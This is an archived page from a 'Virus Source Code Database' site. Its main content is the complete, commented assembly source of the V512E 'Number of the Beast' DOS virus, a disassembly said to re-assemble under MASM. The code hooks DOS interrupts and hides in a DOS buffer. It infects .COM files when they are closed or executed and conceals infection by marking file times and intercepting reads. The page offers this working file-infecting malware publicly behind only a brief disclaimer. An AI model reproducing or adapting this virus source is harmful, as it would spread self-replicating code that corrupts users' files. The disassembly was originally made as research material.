<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 512-e_asm</title>
<meta name="KEYWORDS" content="512-e.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 512-e.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	name	V512E
	title	V512E - The 'Number of the Beast' Virus
	subttl	(Version E - a mutation)
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        บ
; บ  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 บ
; บ									     บ
; บ		     The 'Number of the Beast' Virus, version E              บ
; บ		   Disassembled by Vesselin Bontchev, April 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code,es:code

	org	50

psp_ret equ	$

	org	100

start:
	mov	si,4		; Point DS at interrupt vectors

; Modify the DOS dispatcher at PSP:50h (it contains CD 21 CB - INT 21h; RETF).
; Now it will contain CD 21 95 CB (INT 21h; XCHG AX,BP; RETF) and AX will
; be restored on exit.

	mov	word ptr [si+(50+2-4)],0CB95

	xchg	ax,bp		; Save AX in BP

	mov	ds,si
	lds	dx,[si+8]	; Get INT 13h vector in DS:DX

; The PC-DOS version check is omitted. This is rather strange,
; since the trick below works only for PC-DOS version 3.30.

	mov	ah,13		; Get original INT 13h vector in DS:DX
	int	2F
	push	ds		; Save it
	push	dx
	int	2F		; Call INT 2F again to restore DS & DX
	pop	ax
	mov	di,0F8		; Save the original INT 13h vector at PSP:0F8
	stosw
	pop	ax
	stosw			; Now DI == 0FCh (which is also new_int_21)

	mov	ds,si		; Now get INT 21h vector in DS:AX
	lds	ax,[si+40]

	cmp	ax,di		; Is virus in memory?

	stosw			; Store vector at PSP:0FC
	mov	ax,ds
	stosw			; By the way, now DI == 100h

	push	es		; Now RETF will jump to PSP:100h,
	push	di		;  i.e. to start
	jne	install 	; Virus not present. Go to installation

	shl	si,1		; Second check for virus in memory. SI := 8
	mov	cx,(begword-start)/2	; Compare the virus code with DS:8
	rep	cmpsw
	je	run		; Virus found. Run the original program

; Virus not found in memory. Install it there. The memory check is not
; quite correct. Since the virus does not try to be the fist program
; which intercepts INT 21h, it is possible that it is already present
; in memory, but another program (a TSR one) has changed the INT 21h
; vector. This will cause the reloading of the virus and another buffer
; will "disapear". If there is no more buffers, the machine may hang.

install:
	mov	ah,52		; Get list of lists in ES:BX
	int	21

	push	es		; Save list's segment
	mov	si,0F8		; Prepare for move. Offset of source address.
	les	di,es:[bx+12]	; Point ES:AX at first DOS buffer

; Point DX at next DOS buffer. And what if there are no more buffers?

	mov	dx,es:[di+2]

; Copy the saved original interrupt vectors plus
; the virus body in the 1st DOS buffer:

	mov	cx,(begword-start+8)/2
	rep	movs word ptr es:[di],ss:[si]

	mov	ds,cx		; Install ES:121 (new_int_21)
	mov	di,16		;  as new INT 21h handler
	mov	word ptr [di+21*4-16],(new_int_21 - start) + 8
	mov	[di+21*4-16+2],es

	pop	ds		; Point DS at the list of lists' segment

; "Hide" the virus (now in the first DOS buffer) by excluding this
; buffer from the DOS buffer chain. To do so, just set the
; first buffer pointer to point at the next buffer of the chain.
; (DX already points at the next DOS I/O buffer.)

	mov	[bx+14],dx

	mov	dx,ss		; DX := current PSP
	mov	ds,dx		; Restore DS == CS

	mov	bx,[di+2-16]	; Point BX at high memory
	dec	bh

	mov	es,bx		; Point ES at the last 4 Kbytes of memory

; If the current PSP is less than the previous one, then
; IBMDOS.COM is just loading the command interpretter
; and the current PSP belongs to the latter.

	cmp	dx,[di]

; Get command interpretter's full name in DS:16h

	mov	ds,[di]
	mov	dx,[di]
	dec	dx
	mov	ds,dx

	mov	si,cx		; SI := 0
	mov	dx,di		; DX := 16h (DI == 16h)

; Copy this name (up to 80 characters) to higher memory,
; eventualy destroys COMMAND.COM's transient part.

	mov	cl,80d/2
	rep	movsw

	mov	ds,bx
	jb	boot		; Run command interpretter at boot time

run:
	mov	si,cx		; SI := 0
	mov	ds,ss:[si+2C]	; Get environment address
srch_lp:
	lodsw			; Search the end of the environment
	dec	si
	and	ax,ax
	jnz	srch_lp

	lea	dx,[si+3]	; Get program's name (argv [0]) in DX
boot:
	mov	ax,3D00 	; Open file
	int	21

	xchg	ax,bx		; Save file handle in BX

	pop	si		; Restore SI
	push	si

	push	ss		; DS := SS; ES := SS (== CS)
	pop	ds
	push	ss
	pop	es

	mov	dx,si		; DX := SI

	mov	cl,2		; Read the original first 2 bytes
	mov	ah,3F		;  of the file into DS:[start]
	int	21		; Do it. After it AX == 0002 (i.e. AH == 0)

	mov	dl,cl		; DX := 102h
	xchg	cl,ch		; CX := 200h (512d)

	mov	di,offset ds:[begword]
	cmpsw

	jne	skip1		; Exit if not
	mov	ah,3F		; Otherwise read the next 512 bytes of the file

; Now jump to PSP:50h. There are the instructions INT 21h; RETF there. Thus,
; this will execute the DOS function call in AX, then jump to PSP:100h.
; If the original first word of the file did match the saved word then
; everything is OK, the original first 512 bytes of the file are read and
; executed. The countrary means that the file is destroyed and the
; DOS function 0 (program terminate) is executed instead.

skip1:
	jmp	psp_ret

read:				; READ function handler
	call	point		; Point ES:DI at file's internal FCB
	mov	si,es:[di]	; Remember file position in SI

	mov	ah,3F
	int	21		; Read from file handle

	cmp	si,bp		; Is file position < 512?
	jnb	int_21_xit1	; Exit if not

	push	ax		; Save AX
	mov	al,es:[di-8]	; Get file time
	not	al
	and	al,1F		; Seconds == 62?
	jnz	int_21_xit	; Exit if not

	add	si,es:[di-4]	; Compute offset at original code
	xchg	si,es:[di]	; Swap position (correct)
	add	es:[di-4],bp	; Correct file size (+512)
	mov	ah,3F		; Read from file handle
	int	21
	sub	es:[di-4],bp	; Restore original file size (-512)
	xchg	ax,si		; Restore original position
	stosw
int_21_xit:
	pop	ax		; Restore AX
int_21_xit1:
	pop	es		; Restore saved registers
	pop	si
	pop	di
	pop	bp
	retf	2		; Return error code in flags

get_time:			; Get File Date & Time function handler
	int	21		; Execute the requested function
	lahf			; Save flags
	mov	al,cl		; Get file time
	and	al,1F		;  (the seconds more exactly)
	cmp	al,1F		; Do they indicate an infected file?
	jne	skip2		; Skip the following code if so
	xor	cl,al		; Otherwise zero them to fool everybody
skip2:
	sahf			; Restore flags
	jmp	int_21_xit	; And exit

new_int_21:			; New INT 21h handler
	push	bp		; Save used registers
	push	di
	push	si
	push	es

; See if this handler is executed via an INT 21h from
; the virus body. A rather clumsy check, IMHO.

	cld			; Clear direction flag
	mov	bp,sp
	mov	es,[bp+0A]	; Get the caller's CS
	mov	di,(new_int_21-start+17)
	mov	si,di		; See if the word at CS:[new_int_21]
	cmps	word ptr cs:[si],es:[di] ; equals the resp. word in the caller
	je	exit		; Exit if so

	cmp	ah,3F		; Is it a READ function call?
	je	read		; Do it if so
	push	ax		; Save AX
	cmp	ax,5700 	; Is it a Get File Date & Time function call?
	je	get_time	; Do it if so
	cmp	ah,3E		; Is it a CLOSE function call?
	pushf			; Save flags & registers used
	push	bx
	push	cx
	push	dx
	push	ds
	je	close		; Execute CLOSE function if so was requiested
	cmp	ax,4B00 	; Is it an EXEC function call?
	je	exec		; Do it if so
dos_xit:
	pop	ds		; Restore registers & flags
	pop	dx
	pop	cx
	pop	bx
	popf
	je	int_21_xit
	pop	ax		; Restore AX
exit:
	pop	es		; Restore saved registers
	pop	si
	pop	di
	pop	bp

; Exit trough the original INT 21h handler:

	jmp	dword ptr cs:[4]

exec:
	mov	ah,3Dh		; Open file with Read access (AL == 0)
	int	21h
	xchg	ax,bx		; Save file handle in BX

close:				; CLOSE function handler
	call	point		; Point ES:DI at file position
	jc	dos_xit 	; This instruction is unnecessary

	xor	cx,cx		; CX := 0
	xchg	cx,bp		; BP := 0; CX := 512
	mov	ds,bp		; DS := 0

	mov	si,13*4 	; Point SI at INT 13h vector

; Get new INT 24h handler's address in DX:AX:

	mov	ax,(new_int_24 - start) + 8

	mov	dx,cs
	xchg	ax,[si+(24*4-13*4)]	; Swap it with the old handler
	xchg	dx,[si+(24*4-13*4+2)]
	push	dx		; Save the old INT 24h vector on the stack
	push	ax

	lodsw			; Save the old INT 13h handler on the stack too
	push	ax
	lodsw
	push	ax

	lds	dx,cs:[si-(13*4+4)]	; Set INT 13h to saved vector

	mov	ax,2513 	; Prepare to set vector
	push	ax		; Save operation code on stack
	int	21		; Do set vector

	push	es
	pop	ds		; DS := ES

	mov	[di],bp 	; Seek to file beginning (BP == 0)
	mov	[di-13],ch	; Set access rights to writable (CH == 02h)

	cmp	word ptr [di+13],'OC'   ; '*.CO?' file?
	jne	go_close	; Exit if not

	mov	dx,[di-4]	; Get file size
	add	dh,ch		; Add 512 to it (CX == 0200h)
	cmp	dh,4		; Is file size < 512?
	jb	go_close	; Don't infect if so

; The file_size + virus_length < 64K check has gone. Why?!

	test	ch,[di-11]	; Test Hidden attribute (CH == 10b)
	jnz	go_close	; Exit if ON

	lds	si,[di-0E]	; Get device driver pointer
	cmp	[si+4],ch	; See if at least 3 sectors/cluster (CH == 02h)
	jbe	skip3
	dec	dx
	shr	dh,1		; DH := number of last sector after infection
	and	dh,[si+4]	; Get sector's number in the cluster
	jz	go_close	; Exit if does not fit

skip3:
	mov	ds,bp		; Read 512 bytes using file handle
	mov	dx,cx		;  into 0000:0200h
	mov	ah,3F
	int	21		; Do it

	mov	si,dx		; SI := 512 (DX == 512)
	dec	cx		; CX := 510
	dec	cx
v_srch:
	lodsb
	cmp	al,cs:[si-(512d-8+1)]	; See if virus present in file
	jne	infect		; Infect file if not
	loop	v_srch

go_close:
	mov	ah,3E		; Close file
	int	21		; Do it

	pop	ax		; Restore 2513h in AX from stack

	pop	ds		; Restore old INT 13h handler from stack
	pop	dx
	int	21		; Set old INT 13h interrupt vector

	pop	dx		; Rstore old INT 24h handler from stack
	pop	ds

	mov	al,24		; Set old INT 14h interrupt vector
	int	21		; Do it

	jmp	dos_xit 	; Exit

infect:
	mov	cx,dx		; CX := 512
	mov	si,es:[di-4]	; Get file size
	mov	es:[di],si	; Seek at end of file

	mov	ah,40		; Write to file (the original bytes)
	int	21

	mov	es:[di-4],si	; Restore file size

; Seek to file begining (ES:DI points at file position and BP contains 0):

	xchg	ax,bp
	stosw

	jc	error		; Exit if error in reading
	mov	ax,ds:[200]	; Get the first byte of the code read

	push	cs		; DS := CS
	pop	ds
	mov	word ptr ds:[begword-start+8],ax
	mov	dx,8		; Write virus code (at DS:8) onto
	mov	ah,40		;  the file beginning
	int	21		; Do it

	or	byte ptr es:[di-0A],1F	; Set file time seconds to 62

error:
	or	byte ptr es:[di-11],40	; Set 'file modified' bit
	jmp	go_close	; And exit

point:
	push	bx		; Save BX
	mov	ax,1220 	; Get system file table entry No. for
	int	2F		;  file the handle in BX into ES:DI

